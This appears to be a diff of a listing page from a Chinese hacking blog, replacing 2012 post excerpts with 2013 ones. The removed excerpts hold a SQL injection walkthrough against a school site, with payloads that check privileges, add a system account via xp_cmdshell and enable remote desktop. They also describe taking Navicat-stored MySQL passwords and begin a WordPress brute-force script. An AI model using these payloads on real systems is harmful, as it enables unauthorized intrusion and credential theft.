@@ -45,27 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T15:10:35.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2013-01-24T18:24:49.000Z" itemprop="datePublished">
+          2013-01-25
       </time>
     
     
     | 
-    <a href='/tag/利用navicat提权/'>利用navicat提权</a>
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/Wordpress/'>Wordpress</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/587.seo/">利用navicat提权</a></h2>
+      <h2 class="post-title"><a href="/971.seo/">WordPress Zingiri Forums arbitrary file disclosure</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        navicat是一个比较流行的MySQL管理工具，在很多服务器上都可以找到   有两个方法提权：   1、从日志文件里找密码，navicat会把操作日志（比如加账户）保存到My Documents\Navicat\MySQL\logs下的LogHistory.txt，低版本是安装目录下的logs下LogHistory.txt   2、navicat管理的MySQL服务器信息（一般是root帐户）是存在注册表里的，具体是HKEY_CURR
+        WordPress Forums插件’url’参数任意文件泄露漏洞的利用  参考：  WordPress Zingiri Forums arbitrary file disclosure    http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/  Secunia Advisory SA50833    http://secu
       
       </p>
       
       <p>
-          <a href="/587.seo/" class="excerpt-link">Read More...</a>
+          <a href="/971.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -74,33 +76,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T14:30:58.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2013-01-21T23:26:11.000Z" itemprop="datePublished">
+          2013-01-22
       </time>
     
     
     | 
-    <a href='/tag/注入/'>注入</a>,
+    <a href='/tag/Anonymous/'>Anonymous</a>,
     
-    <a href='/tag/注入漏洞/'>注入漏洞</a>,
-    
-    <a href='/tag/搜索型注入/'>搜索型注入</a>,
-    
-    <a href='/tag/手工注入/'>手工注入</a>
+    <a href='/tag/匿名者/'>匿名者</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/584.seo/">搜索型注入漏洞手工注入过程</a></h2>
+      <h2 class="post-title"><a href="/970.seo/">黑客组织Anonymous疯狂入侵中国站点思路分析</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>原文：<a href="http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt">http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt</a></p>  <p>本人是小菜，水平有限，但是为了论坛做贡献，还是自己写点原创的东西出来吧。希望大牛看了别笑就好了。。。。   <br />==================================================    <br />前段时间朋友丢了一个站过来，说是他们学校的。叫我帮忙检测下。    <br />于是看了下。用扫描器扫了下，没有啥可以上传利用的，发现后台，默认和万能密码无效，    <br />无注入点，手工和工具试过了，防注入，COOKIES注入也不行。找不到程序源码，没办法分析。旁注 ？    <br />整站是独立服务器，就一个站，旁注也没办法。难到要C段？好麻烦哦。丢给群里一些大牛看看，    <br />都说搞不定（应该是没认真看吧。），我大受打击，但是我不放弃，再去看看先。    <br />于是，发现了一个搜索框，直觉告诉我，这就是突破点，果然….. </p>  <p>前段时间的事情了，没办法截图。   <br />整个过程做了简单的笔记，和搜集了一些手工注入的代码。凑合着看吧。 </p>  <p>首先，简单的判断搜索型注入漏洞存在不存在的办法是先搜索，如果出错，说明90%存在这个漏洞。 </p>  <p>a%’ and 1=1– 正常   <br />a%’ and 1=2– 错误 </p>  <p>有注入 </p>  <p>由于网站过滤了 ‘ 等等的。所以工具不行，要手工了。累人啊~~~ </p>  <p>判断权限   <br />a%’ and (select is_member(‘dbo’))=1–&#160;&#160;&#160; 返回正常则 sa    <br />a%’ and (select is_member(‘db_owner’))=1–&#160;&#160; 返回正常则 DB    <br />都不是那就只有一种可能啦，public，权限貌似很小。 </p>  <p>也可以用另一种命令来判断权限   <br />a%’ and 1=(Select IS_SRVROLEMEMBER(‘sysadmin’));– sa    <br />a%’ and 1=(Select IS_MEMBER(‘db_owner’));– DB    <br />================================================================    <br />sa 的方法。直接建立系统帐号密码。登陆3389. </p>  <p>命令是    <br />a%’;exec master..xp_cmdshell&quot;net user admins 123456 /add&quot;– </p>  <p>如果 ‘xp_cmdshell’ 被关闭了。就来开启他。   <br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;reconfigure    <br />最后这个为1是开启.为0是关闭.    <br />a%’ ;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXECsp_configure ‘xp_cmdshell’, 1;RECONFIGURE– </p>  <p>如果不开3389 </p>  <p>下面的命令。。 </p>  <p>a%’;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;– </p>
+        <p>关于<a href="http://ha.cker.in/tag/匿名者" target="_blank">匿名者</a>组织的疯狂拿站和统一黑页显示时间的行为，相信大家已经见怪不怪了，但是当匿名者组织开始侵略中国网站的时候，相信大家都坐不住了。首先，个人感觉反击的意义何在，或者说究竟有没有意义，笔者不是哲学家，思想家，不做过多探讨。但是，知己知彼确实是必要的。笔者对前一段时间，国内地方GOV被疯狂秒杀的一次行动做了一次没什么技术含量的分析和猜想。</p>  <p>（以下敏感域名用WWW.XXX.COM略过）</p>  <p>首先，笔者登陆了FACEBOOK找寻了一些热议的话题：</p>  <p>（以下为GOOGLE翻译，英文不好，只好找谷大哥帮忙）</p>  <p>1.中国3000+政务工作网站 匿名者成功获取权限</p>  <p>2.匿名者再次攻击亚洲各国，宣传独立自由 在网络中</p>  <p>3.亚洲强国网络安全成为匿名者的击打目标。</p>  <p>以上是通过匿名者为关键字模糊搜索的热议转载，基本每个热议都指向匿名者发布新闻和预告信的推特，笔者只好继续翻阅防火长城登陆推特，观看了一些匿名者发布针对亚洲和其他洲的攻击成果发布，评论中充斥着各种赞扬与羡慕，当然不乏我国人士（最大的悲剧），当然，也有进行技术分析的人，有一条评论中带有这样一个域名：</p>  <p>www.xxseo.com（化名）</p>  <p>接着，笔者C段了一下：</p>  <p>IP：</p>  <p>XXX.XXX.XXX.200</p>  <p>XXX.XXX.XXX.201</p>  <p>XXX.XXX.XXX.202</p>  <p>XXX.XXX.XXX.203</p>  <p>XXX.XXX.XXX.204</p>  <p>XXX.XXX.XXX.205</p>  <p>``````````````````````````````</p>  <p>以上IP全部指向中国某省级机房</p>  <p>OK，就这个IP段开始旁站扫描，得到无数四级域名：</p>  <p>XXX.host1068.xxxseo.com.cn</p>  <p>XXX.host1079.xxxseo.com.cn</p>  <p>XXX.host1081.xxxseo.com.cn</p>  <p>XXX.host1083.xxxseo.com.cn</p>  <p>XXX.host1093.xxxseo.com.cn</p>  <p>XXX.host1099.xxxseo.com.cn</p>  <p>·····························</p>  <p>相信看到这里，大家应该明白了些什么，当然笔者还是打开验证了下</p>  <p>无一例外，全部是政务网站，各地GOV。</p>  <p>XXX.host1099.xxxseo.com.cn</p>  <p>都是IDC机房托管的分配四级域名，实际绑定是WWW.XXX.GOV.CN</p>  <p>笔者继续扫描旁站，并导出所有URL（四级域名）</p>  <p>将导出的列表批量经行绑定域名反查，得到实际绑定域名结果列表。</p>  <p>在工具经行这些自动化扫描导出的时候，笔者继续做着准备，将匿名者在推特发布的攻击我国站点的列表下载了一份，可以不是文本，图片质量又狂差，只能美图秀秀去个雾（不会PS的伤不起），勉强看清了URL。</p>  <p>准备工作做完，手上有两份列表，一份是扫描旁站得出的IDC C段的GOV站点 URL列表。另一份是匿名者发布的攻击我国站点公开列表。</p>  <p>然后笔者比对了一下，相信结果大家都猜到了。</p>  <p>IDC下的163个GOV站点，有112个在匿名者攻击列表中，当然匿名者公布了3000+个。</p>  <p>好的，对匿名者每次行动的印象让我立即从庞大组织的集体攻击，变成了组织性的批量拿站。</p>  <p>这个时候，笔者又有了另一个猜想，即使是批量攻击，整个C段也是要花时间的，于是笔者爬行了5个网站的目录，BINGO，全中，居然是一模一样的目录结构，好的，原来是一个公司的业务啊！统一的建站系统，统一的OA系统，统一的邮件系统，统一的VPN登陆远程办公系统，好吧，你赢了！</p>  <p><a href="http://img.cker.in/Anonymous_D8D1/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Anonymous_D8D1/clip_image001_thumb.jpg" width="504" height="344" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/584.seo/" class="excerpt-link">Read More...</a>
+          <a href="/970.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -109,29 +107,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T14:26:53.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2013-01-21T20:31:01.000Z" itemprop="datePublished">
+          2013-01-22
       </time>
     
     
     | 
-    <a href='/tag/Wordpress/'>Wordpress</a>,
-    
-    <a href='/tag/暴力破解/'>暴力破解</a>
+    <a href='/tag/xss/'>xss</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/582.seo/">wp密码暴力破解</a></h2>
+      <h2 class="post-title"><a href="/969.seo/">WordPress WP SlimStat 插件&quot;s&quot;脚本注入漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        #!/bin/bash     #by leo108      #使用方式：./wp-pwd.sh 用户名 字典 登录页面 线程数      #例如: ./wp-pwd.sh leo 1.txt http://xxx.com/wp-login.php 15     user=$1      zidian=$2      url=$3      thread=$4      function guess {      &#160;&#16
+        WordPress WP SlimStat是实时Web分析插件。 WordPress WP SlimStat 2.8.4及之前版本没有正确过滤wp-content/plugins/wp-slimstat/admin/view/panel1.php内index.php的 &quot;s&quot; 参数值，可被利用插入任意HTML和脚本代码。  &#160;  查看版本：wordpress\wp-content\plugins\wp-sl
       
       </p>
       
       <p>
-          <a href="/582.seo/" class="excerpt-link">Read More...</a>
+          <a href="/969.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -140,64 +136,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T13:34:37.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2013-01-21T20:18:26.000Z" itemprop="datePublished">
+          2013-01-22
       </time>
     
     
     | 
-    <a href='/tag/Linux/'>Linux</a>,
+    <a href='/tag/提权/'>提权</a>,
     
-    <a href='/tag/VPS/'>VPS</a>,
-    
-    <a href='/tag/Kloxo/'>Kloxo</a>,
-    
-    <a href='/tag/Lxadmin/'>Lxadmin</a>,
-    
-    <a href='/tag/虚拟主机控制面板/'>虚拟主机控制面板</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/577.seo/">如何通过SSH在Linux VPS上安装Kloxo Lxadmin</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>每次重装VPS的系统后都要Google一下VPS控制面板及配置一些的方法。因为不是经常用到，所以记不住。时间久了还是决定自己整理一份安装说明，这样查找起来比较方便。本文适合未接触过<a href="http://ha.cker.in/tag/Linux" target="_blank">Linux</a>和<a href="http://ha.cker.in/tag/Kloxo" target="_blank">Kloxo</a>的同学参考。</p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/SSHLinuxVPSKloxoLxadmin_4E4D/clip_image002.jpg" width="514" height="369" /></p>  <p><a href="http://ha.cker.in/tag/Kloxo" target="_blank">Kloxo</a>的前身是<a href="http://ha.cker.in/tag/Lxadmin" target="_blank">Lxadmin</a>，是一款免费、开源、高效、灵活的虚拟主机控制面板，只需15MB的内存就可以运行在32位Red Hat和CentOS Linux发行版（RHEL系列）上面。Kloxo能够在Apache与Lighttpd这两大Web Server之间灵活切换，同时集成了MySQL、pure-ftpd、Xcache、djbdns/bind、SUexec等服务器组件。如果你想了解更多Kloxo的资料可以访问：<a href="http://en.wikipedia.org/wiki/Kloxo">Kloxo维基百科</a>和<a href="http://www.lxcenter.org/">Kloxo官方网站</a>。</p>  <p>很多运营商都有提供管理平台让客户对自己的<a href="http://ha.cker.in/tag/VPS" target="_blank">VPS</a>做一些常规管理，比如系统开关重启、系统重装、资源使用率查看等。今天用DirectSpace的VPS做Kloxo安装步骤介绍，他们使用SolusVM做管理平台。通过SolusVM重装纯净的CentOS后，我的VPS内存占用约15MB左右。关于如何重装VPS系统请咨询你的运营商。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/577.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T12:29:20.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
     <a href='/tag/渗透/'>渗透</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/572.seo/">渗透一站全过程</a></h2>
+      <h2 class="post-title"><a href="/968.seo/">对某学校教务系统的一次渗透</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>目标的环境：   <br />目测 2003+iis6+asp.net+mssql&#160; 但是这个网站程序应该是使用的某个asp.net+soap开发的，至少出现漏洞的地方是。    <br /><b>一</b><b>.Web</b><b>站点的渗透</b>    <br />这次渗透并未使用任何扫描嗅探工具去探测目标完全使用手工检查的,经过一系列的测试后在网页源代码里面发现了一个比较有意思的链接。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/4cca5dc413a9_3F08/clip_image001.jpg" width="558" height="238" />    <br />上图中用篮筐拉出来的地址，引起了我的注意。根据名字这应该是用于上传文件的。    <br />访问这个链接后就证实了我的猜想</p>
+        目标:oa.school.com&#160; IP:192.168.100.100 OA系统 (域名ip均已经过处理)   目的：登陆该后台管理系统 进行某个目的     0x01    检测并提权     某商业oa程序 无0day 网上也没有相关漏洞信息 ， 无同服务器站点，简单的进行了 常规web漏洞扫描、目录扫描、手工探测、端口信息、简单的对各开放并可能利用的端口进行密码破解 未果    通过google搜索并整理相关二级域名 
       
       </p>
       
       <p>
-          <a href="/572.seo/" class="excerpt-link">Read More...</a>
+          <a href="/968.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -206,27 +167,56 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T12:20:49.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2013-01-17T21:26:23.000Z" itemprop="datePublished">
+          2013-01-18
       </time>
     
     
     | 
-    <a href='/tag/Helen/'>Helen</a>
+    <a href='/tag/360浏览器抢票专版/'>360浏览器抢票专版</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/569.seo/">你不共享，我何必与你分享</a></h2>
+      <h2 class="post-title"><a href="/967.seo/">360浏览器抢票专版</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        上班睡觉之外空闲的时间把以前学习收集的笔记共享出来，1是为了刚入门的朋友方便，有更多的资料可以参考给读者点灵感，2是作个备份，因为有的文章网上已经找不到了，而想到这些大牛以前的作品就这样与我们失之交臂多么可惜，我就忍不住潸然泪下于是我立下决心，就是再裤再累再穷我都要给他整理好了给大家看 3是给自己一个温习的机会，自己在整理回顾一下的同时也理清思路，4是希望交一些共同研究的朋友。这些天快成小编辑了！其实我是九区的一员，嘘……低调。。国际黑
+        360浏览器抢票专版  &#160;  360浏览器抢票专版下载  360浏览器抢票专版听说很好用？
       
       </p>
       
       <p>
-          <a href="/569.seo/" class="excerpt-link">Read More...</a>
+          <a href="/967.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-01-16T03:11:42.000Z" itemprop="datePublished">
+          2013-01-16
+      </time>
+    
+    
+    | 
+    <a href='/tag/Mongodb/'>Mongodb</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/966.seo/">Mongodb学习手册</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><p><a href="http://ha.cker.in/tag/Mongodb" target="_blank">Mongodb</a>学习手册</p>  <p>启动mongodb服务进程：</p>  <p><a href="http://ha.cker.in/tag/Mongodb" target="_blank">MongoDB</a>默认的数据库文件的位置是/data/db，但是它不会自动的生产目录，所以如果采用默认的文件位置的话，我们需要自己先建立该目录，如下：</p>  <p>$ sudo mkdir -p /data/db/ </p>  <p>$ sudo chown <code>id -u</code> /data/db </p>  <p>接下来可以启动 mongodb的服务了：</p>  <p>$ ./mongod </p>  <p>我们也可以用-dbpath选项来指定自己的数据库位置，如下：</p>  <p>$ ./mongod -dbpath ../../data/db</p>  <p>启动成功以后，会有如下界面显示：</p>  <p>[tsaip@ossesbwas bin]$ Mon May 30 12:17:16 [initandlisten] MongoDB starting : </p>  <p>pid=3662 port=27017 dbpath=../../data/db 64-bit</p>  <p>Mon May 30 12:17:16 [initandlisten] db version v1.8.2-rc2, pdfile version 4.5 </p>  <p>Mon May 30 12:17:16 [initandlisten] git version: </p>  <p>373038f53049071fddb5404698c8bebf99e3b51f </p>  <p>Mon May 30 12:17:16 [initandlisten] build sys info: Linux bs-linux64.10gen.cc </p>  <p>2.6.21.7-2.ec2.v1.2.fc8xen #1 SMP Fri Nov 20 17:48:28 EST 2009 x86_64 </p>  <p>BOOST_LIB_VERSION=1_41 </p>  <p>Mon May 30 12:17:16 [initandlisten] waiting for connections on port 27017 </p>  <p>Mon May 30 12:17:16 [websvr] web admin interface listening on port 28017</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/966.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -234,7 +224,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/page/26/">← Newer Posts</a>
-    <span class="page-number">Page 27 of 57</span>
+    <span class="page-number">Page 27 of 81</span>
     <a class="older-posts" href="/page/28/">Older Posts →</a>
   </nav>
 </main>
